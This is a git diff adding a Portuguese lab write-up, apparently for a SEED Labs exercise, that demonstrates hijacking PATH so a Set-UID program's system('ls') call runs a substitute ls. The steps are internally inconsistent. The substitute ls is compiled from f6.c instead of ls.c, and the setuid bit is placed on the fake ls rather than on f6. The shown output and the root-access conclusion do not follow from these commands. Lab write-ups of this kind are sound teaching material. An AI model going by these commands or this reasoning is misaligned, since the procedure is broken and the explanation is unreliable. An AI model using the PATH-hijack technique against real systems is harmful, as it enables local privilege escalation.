@@ -68,7 +68,60 @@ O resultado  é inesperado na medida em que, apesar do processo filho herdar as 
 
 ## Tarefa 2.6
 
+Começamos por compilar o programa sugerido na tarefa. Definimos também um programa `ls.c`.
 
+```c
+// f6.c
+int main() {
+    system("ls");
+    return 0;
+}
+
+// ls.c
+int main() {
+    printf("My ls\n");
+    return 0;
+}
+```
+```bash
+$ gcc -o f6 f6.c
+$ gcc -o ls f6.c
+```
+
+Correndo o programa f6, obtemos o comportamento normal do comando `ls`.
+
+```bash
+$ f6
+f6 f6.c ls ls.c
+```
+
+De seguida, transformamos o programa `ls` num programa UID.
+
+```bash
+$ ls -l ls
+-rwxrwxr-x 1 seed seed 16696 Oct 11 18:35 ls
+$ sudo chown root ls
+$ sudo chmod 4755 ls
+$ ls -l ls
+-rwsr-xr-x 1 root seed 16696 Oct 11 18:35 ls
+```
+
+Posto isto, alteramos a variável de ambiente `PATH`.
+
+```bash
+$ pwd
+/home/seed/Labs/Labsetup
+$ printenv PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:.
+$ export PATH=/home/seed/Labs/Labsetup:$PATH
+```
+
+```bash
+$ f6
+My ls
+```
+
+Podemos então observar que o programa `f6` passa agora a correr a nossa versão de `ls`. Isto acontece porque o programa usa um caminho relativo e após alterarmos a variável `PATH`, `f6` irá procurar pelo `ls` no diretório local. Sendo assim, como `ls` tem acesso root, é essa a versão que é executada. É possível então concluir que programas SET UID podem correr código malicioso alterando uma variável de ambiente.
 
 <br/>
 
